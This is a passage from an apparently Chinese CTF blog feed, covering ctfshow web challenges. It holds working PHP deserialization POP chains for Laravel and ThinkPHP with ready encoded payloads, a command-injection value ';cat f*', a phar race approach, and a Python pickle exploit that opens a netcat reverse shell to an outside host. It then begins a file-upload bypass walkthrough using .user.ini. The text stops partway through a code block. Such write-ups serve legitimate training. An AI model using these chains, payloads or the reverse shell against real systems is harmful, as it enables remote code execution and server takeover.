class_">Foundation</span>\<span class="title class_">Testing</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">DefaultGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">default</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="keyword">default</span> = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span> &#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Application</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">instances</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$instances</span> = []</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;instances[<span class="string">&#x27;Illuminate\Contracts\Console\Kernel&#x27;</span>] = <span class="variable">$instances</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">defaultgenerator</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">DefaultGenerator</span>(<span class="title class_">array</span>(&quot;<span class="title class_">DawnT0wn</span>&quot; =&gt; &quot;1&quot;));</span><br><span class="line">    <span class="variable">$app</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>();</span><br><span class="line">    <span class="variable">$application</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Application</span>(<span class="variable">$app</span>);</span><br><span class="line">    <span class="variable">$pendingcommand</span> = <span class="keyword">new</span> <span class="title class_">Illuminate\Foundation\Testing\PendingCommand</span>(<span class="variable">$defaultgenerator</span>, <span class="variable">$application</span>, <span class="string">&quot;system&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;cat /flag&quot;</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$pendingcommand</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>post:<code>data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A4%3A%22test%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Ba%3A1%3A%7Bs%3A8%3A%22DawnT0wn%22%3Bs%3A1%3A%221%22%3B%7D%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00instances%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A0%3A%7B%7D%7D%7D%7D%7D%7D</code></p><h1 id="WEB-272-273-Laravel5-8反序列化"><a href="#WEB-272-273-Laravel5-8反序列化" class="headerlink" title="WEB-272~273(Laravel5.8反序列化)"></a>WEB-272~273(Laravel5.8反序列化)</h1><p>poc如下 参考<a href="https://blog.csdn.net/qq_61991235/article/details/123583489?ydreferer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8=">https://blog.csdn.net/qq_61991235/article/details/123583489?ydreferer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8%3D</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>\<span class="title class_">Dispatcher</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Console</span>\<span class="title">QueuedCommand</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PendingBroadcast</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;events=<span class="keyword">new</span> <span class="title class_">Dispatcher</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;event=<span class="keyword">new</span> <span class="title class_">QueuedCommand</span>();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Foundation</span>\<span class="title class_">Console</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>\<span class="title class_">MockDefinition</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">QueuedCommand</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$connection</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;connection=<span class="keyword">new</span> <span class="title class_">MockDefinition</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Generator</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">MockDefinition</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;code=<span class="string">&quot;&lt;?php echo system(&#x27;cat /flag&#x27;); exit(); ?&gt;&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config=<span class="keyword">new</span> <span class="title class_">MockConfiguration</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Illuminate</span>\<span class="title class_">Bus</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>\<span class="title class_">EvalLoader</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Dispatcher</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$queueResolver</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;queueResolver=[<span class="keyword">new</span> <span class="title class_">EvalLoader</span>(),<span class="string">&#x27;load&#x27;</span>];</span><br><span class="line">            <span class="comment">//$this-&gt;queueResolver=array(new EvalLoader(),&#x27;load&#x27;); </span></span><br><span class="line">            <span class="comment">//数组</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Mockery</span>\<span class="title class_">Loader</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">EvalLoader</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Illuminate</span>\<span class="title class_">Broadcasting</span>\<span class="title class_">PendingBroadcast</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">PendingBroadcast</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>post:<code>data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A0%3A%7B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A42%3A%22%3C%3Fphp+echo+system%28%27cat+%2Fflag%27%29%3B+exit%28%29%3B+%3F%3E%22%3B%7D%7D%7D</code></p><h1 id="WEB-274-thinkPHP5-1反序列化"><a href="#WEB-274-thinkPHP5-1反序列化" class="headerlink" title="WEB-274(thinkPHP5.1反序列化)"></a>WEB-274(thinkPHP5.1反序列化)</h1><p>看到界面就很熟悉一眼丁真是thinkphp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;ethan&quot;</span>=&gt;[<span class="string">&quot;dir&quot;</span>,<span class="string">&quot;calc&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;ethan&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">    <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,<span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">    <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,<span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">    <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,<span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">    <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,<span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">    <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],<span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">    <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,<span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">    <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,<span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">    <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,<span class="comment">// HTTPS代理标识</span></span><br><span class="line">    <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,<span class="comment">// IP代理获取标识</span></span><br><span class="line">    <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,<span class="comment">// URL伪静态后缀</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&amp;shell=cat /flag</span><br></pre></td></tr></table></figure><h1 id="WEB-275"><a href="#WEB-275" class="headerlink" title="WEB-275"></a>WEB-275</h1><p>这道题有个逻辑错误 一开始我还以为关键在于<code>copy($_GET[&#39;fn&#39;],md5(mt_rand()).&#39;.txt&#39;);</code></p><p>这道题目问题是将我们木马文件赋值到一个随机文件中 然后把我们的文件删了 </p><p>本来想是在他删除我们文件之前利用重定向 将flag读到别的文件中 之后发现不行 没有权限好像</p><p>看了眼wp 返现纯纯的逻辑问题 直接利用析构函数里的system 拼接命令即可</p><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="function"><span class="keyword">fn</span>=</span>;cat f*</span><br><span class="line">post:flag=<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="WEB-276-phar反序列化"><a href="#WEB-276-phar反序列化" class="headerlink" title="WEB-276(phar反序列化)"></a>WEB-276(phar反序列化)</h1><p>首先这道题目增加了一个admin 想进入析构函数执行system则必须修改这个admin</p><p>那么就需要进行反序列化 但是题目并没有给我们反序列化的函数</p><p>然后看了wp就是通过phar来进行的 </p><p>首先上传一个文件然后内容是phar生成的内容(包含我们的恶意序列化内容) 这是一个固定格式 我之前总结过这里就不赘述了</p><p>但是一开始我最大的问题 我们上传的文件需要配合phar:&#x2F;&#x2F;协议 然后我们的恶意内容才会进行反序列化</p><p>在哪里利用phar:&#x2F;&#x2F;呢 然后又检索了一番 原来是我们上传上去之后 脚本源码是通过unlink函数进行删除我们上传的文件的 刚好这个unlink函数就可以配合phar:&#x2F;&#x2F;协议将我们的恶意内容反序列化 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688626698460-3d19f897-bf37-42d3-9f43-4837397627db.png" alt="img"></p><p>因此这里需要条件竞争 一个包一直发上传phar序列化内容的包 另一个包一直发phar:&#x2F;&#x2F;协议访问我们上传文件的包</p><p>但是不知道是我哪里不对，还是题目环境问题，不管是自己发包还是别人的poc，我一直没成功，不过明白怎么做就ok了，思路最重要。</p><p>然后受影响的函数有这些</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688626857137-67729b1e-5c69-4be4-bad3-918e41ebd0d4.png" alt="img"></p><p>偷的：<a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p><h1 id="WEB-277-288（python）"><a href="#WEB-277-288（python）" class="headerlink" title="WEB-277 288（python）"></a>WEB-277 288（python）</h1><p>常规反序列化 </p><p>查看源码<code>#--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m)</code></p><p>EXP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="comment">#--/backdoor?data= m=base64.b64decode(data) m=pickle.loads(m)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EXP</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span>(<span class="built_in">eval</span>, (<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc ip 7777 -e /bin/sh&#x27;)&quot;</span>,))</span><br><span class="line">exp = EXP()</span><br><span class="line">a = pickle.dumps(exp)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure><h1 id="尾巴："><a href="#尾巴：" class="headerlink" title="尾巴："></a>尾巴：</h1><p>至此 即将进军java模块 当然准备开始学习java！冲就完了</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-文件上传</title>
      <link href="/post/c5a854c1.html"/>
      <url>/post/c5a854c1.html</url>
      
        <content type="html"><![CDATA[<p>ctfshow-文件上传</p><span id="more"></span><h1 id="WEB-151-前端验证"><a href="#WEB-151-前端验证" class="headerlink" title="WEB-151(前端验证)"></a>WEB-151(前端验证)</h1><p>上传png后缀的 然后抓包改回php即可</p><h1 id="WEB-152-后端Content-Type校验"><a href="#WEB-152-后端Content-Type校验" class="headerlink" title="WEB-152(后端Content-Type校验)"></a>WEB-152(后端Content-Type校验)</h1><p> Content-Type是返回消息中非常重要的内容，表示后面的文档属于什么MIME类型。  </p><p>所以跟151做法一样 先上传png然后bp改后缀即可</p><p>参考：</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types</a></p><p><a href="https://segmentfault.com/a/1190000013056786">https://segmentfault.com/a/1190000013056786</a></p><h1 id="WEB-153（-user-ini）"><a href="#WEB-153（-user-ini）" class="headerlink" title="WEB-153（.user.ini）"></a>WEB-153（.user.ini）</h1><p>前两种通过修改后缀这里不能用了</p><p>访问&#x2F;upload 发现有内容nothing here 然后可以猜到这里有&#x2F;uplaod&#x2F;index.php </p><p>那么目标就很明确了 我们上传的路径下有一个现成的php文件 理所当然想到通过上传.user.ini来做这道题</p><p>但是.htaccess只是适用于apache，如果变成niginx或者iis则不会被解析  </p><p>通过报错我们可以看到题目环境中间件是nginx 但是这也不影响我们用.user.ini</p><p>因为只要用了fastcgi我们就可以用.user.ini</p><p>FastCGI常用于将Web服务器（如Nginx、Apache）与应用程序（如PHP、Python、Ruby）进行集成，以提供动态内容的生成和处理能力。它是一种高性能、灵活和可扩展的Web应用程序交互协议。  </p><p>.user.ini:</p><p>.user.ini也是php的一种配置文件，众所周知php.ini是php的配置文件，它可以做到显示报错，导入扩展，文件解析，web站点路径等等设置。但是如果想要把某个文件里面的配置与全局的php.ini不同，则可以在php文件中加上ini_set()来配置特定的配置变量。</p><p>而.user.ini和.htaccess一样是对当前目录的所以php文件的配置设置，即写了.user.ini和它同目录的文件会优先使用.user.ini中设置的配置属性。</p><p>偷的<a href="https://www.cnblogs.com/sijidou/p/13121301.html">https://www.cnblogs.com/sijidou/p/13121301.html</a></p><p>简单理解就是php的配置文件它可以设置一些配置 比如怎么去解析我们上传的文件一类的</p><p>内容:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//.user.ini</span></span><br><span class="line"></span><br><span class="line">auto_prepend_file=top.html</span><br><span class="line">auto_append_file=down.html</span><br></pre></td></tr></table></figure><p>怎么理解？</p><p>就是把我们指定的文件包含进宿主php文件中 利用其实本质就是用require()去包含我们的恶意文件并且即使后缀不是php文件也可被当作php文件来解析</p><p>这里require()完全就是include()函数一样</p><p>一个是宿主php文件头部去包含 一个是尾部两者皆可</p><p>先将.user.ini增加后缀png然后抓包去除 在上传我们指定的恶意文件</p><p>这时我们前面已经说的很清楚了 直接访问&#x2F;upload&#x2F;index.php 这样我们的木马就被包含在这个index.php文件中了而不是直接去访问我们的木马文件</p><p>可以看到 已经包含在头部了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1688359146297-fb9749ff-2ad8-4a8d-b933-10f21f0d0931.png" alt="img"></p><h1 id="WEB-154-155（-user-ini-短标签）"><a href="#WEB-154-155（-user-ini-短标签）" class="headerlink" title="WEB-154~155（.user.ini+短标签）"></a>WEB-154~155（.user.ini+短标签）</h1><p>waf了文件内容php字样</p><p>用短标签bypass即可 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 